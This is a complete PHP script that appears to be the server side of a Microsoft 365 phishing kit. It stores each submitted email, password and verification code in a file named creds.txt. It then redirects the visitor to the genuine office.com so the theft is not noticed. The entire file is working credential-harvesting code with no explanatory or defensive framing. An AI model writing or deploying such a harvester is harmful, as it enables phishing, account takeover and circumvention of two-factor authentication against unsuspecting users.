<?php
    $creds = fopen("creds.txt", "w") or header("Location: https://www.office.com");
    $cred = $_POST["email"] . "  :  " . $_POST["password"] . "  :  " . $_POST["code"];
    fwrite($creds, $cred);
    fclose($creds);
    // Redirect to Microsoft
    header("Location: https://www.office.com");
    print("Success");
?>